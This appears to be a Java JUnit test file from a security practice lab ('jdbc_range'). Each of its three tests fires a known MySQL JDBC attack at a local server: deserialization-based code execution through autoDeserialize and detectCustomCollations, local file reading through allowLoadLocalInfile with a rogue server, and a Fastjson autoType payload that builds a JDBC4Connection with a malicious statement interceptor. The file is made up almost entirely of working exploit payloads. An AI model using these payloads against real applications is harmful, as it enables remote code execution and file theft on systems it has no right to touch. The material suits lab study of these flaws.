package com.endlessshw.jdbc_range;

import com.alibaba.fastjson.JSON;
import org.junit.jupiter.api.Test;

import java.sql.Connection;
import java.sql.DriverManager;
import java.util.Properties;

/**
 * @author hasee
 * @version 1.0
 * @description: TODO
 * @date 2024/10/30 19:02
 */
public class JDBCTest {
    @Test
    public void testRCE() throws Exception{
        String CLASS_NAME = "com.mysql.jdbc.Driver";
        String URL        = "jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true";
        String USERNAME   = "EndlessShw";
        // String PASSWORD   = "123456";

        Class.forName(CLASS_NAME);
        Connection connection = DriverManager.getConnection(URL, USERNAME, "");
        connection.close();
    }

    @Test
    public void testFileRead() throws Exception{
        String CLASS_NAME = "com.mysql.jdbc.Driver";
        String URL        = "jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true" +
                "&autoDeserialize=true&maxAllowedPacket=655360&allowLoadLocalInfile=true";
        String USERNAME   = "win_ini";
        // String PASSWORD   = "123456";

        Class.forName(CLASS_NAME);
        Connection connection = DriverManager.getConnection(URL, USERNAME, "");
        connection.close();
    }

    @Test
    public void testFastjsonJDBC() throws Exception {
        String payload = "{\n" +
                "\t\"name\": {\n" +
                "\t\t\"@type\": \"java.lang.AutoCloseable\",\n" +
                "\t\t\"@type\": \"com.mysql.jdbc.JDBC4Connection\",\n" +
                "\t\t\"hostToConnectTo\": \"127.0.0.1\",\n" +
                "\t\t\"portToConnectTo\": 3306,\n" +
                "\t\t\"info\": {\n" +
                "\t\t\t\"user\": \"EndlessShw\",\n" +
                "\t\t\t\"password\": \"\",\n" +
                "\t\t\t\"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\n" +
                "\t\t\t\"autoDeserialize\": \"true\",\n" +
                "\t\t\t\"NUM_HOSTS\": \"1\"\n" +
                "\t\t}\n" +
                "\t}\n";
        JSON.parseObject(payload);
    }
}
